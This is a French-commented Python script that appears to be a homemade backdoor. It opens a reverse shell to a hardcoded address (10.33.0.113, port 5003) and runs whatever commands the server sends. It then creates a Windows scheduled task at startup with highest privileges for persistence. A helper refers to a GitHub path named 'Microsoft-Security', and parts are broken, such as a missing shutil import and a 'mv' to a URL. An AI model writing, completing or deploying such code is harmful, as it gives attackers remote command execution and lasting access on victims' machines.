import socket
import os
import subprocess
import sys
import os
import getpass
import subprocess

SERVER_HOST = "10.33.0.113"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128  # Taille maximale des messages, n'hésitez pas à augmenter
# Séparateur pour envoyer 2 messages en une seule fois
SEPARATOR = "<sep>"


# Création de l'objet socket
s = socket.socket()
# Connexion au serveur
s.connect((SERVER_HOST, SERVER_PORT))

# Récupération du répertoire courant
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # Réception de la commande depuis le serveur
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # Si la commande est "exit", on sort de la boucle
        break
    if splited_command[0].lower() == "cd":
        # Commande cd, changement de répertoire
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # En cas d'erreur, on l'enregistre comme sortie
            output = str(e)
        else:
            # Si l'opération réussit, message vide
            output = ""
    else:
        # Exécution de la commande et récupération des résultats
        output = subprocess.getoutput(' '.join(splited_command))
    # Récupération du répertoire courant comme sortie
    cwd = os.getcwd()
    # Envoi des résultats au serveur
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# Fermeture de la connexion client
s.close()
def install_file(filename):
    temp_dir = os.path.join(os.path.expanduser("~"), "temp")
    temp_filepath = os.path.join(temp_dir, filename)
    os.makedirs(temp_dir, exist_ok=True)
    shutil.move(filename, temp_filepath)
    subprocess.Popen(["mv", temp_filepath, "https://raw.githubusercontent.com/yficadiere/Microsoft-Security/main/Python/Main.py"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def create_startup_task():
    # Obtenir le nom d'utilisateur actuel
    username = getpass.getuser()

    # Définir le chemin vers l'exécutable Python
    python_path = sys.executable

    # Définir le chemin vers le fichier Main.py
    main_file_path = "C:/Users/ficad/OneDrive - Reseau-GES/Cours de HOTPLUG/Python/Main.py"

    # Définir la commande pour lancer le fichier Main.py
    command = f'{python_path} "{main_file_path}"'

    # Définir le nom et la description de la tâche
    task_name = "Lancer Main.py au démarrage"
    task_description = "Lance le fichier Main.py au démarrage du système"

    # Créer la tâche planifiée en utilisant la commande schtasks
    subprocess.run(['schtasks', '/create', '/tn', task_name, '/tr', command, '/sc', 'onstart', '/ru', username, '/rl', 'HIGHEST', '/f'], check=True)

# Créer la tâche de démarrage
create_startup_task()
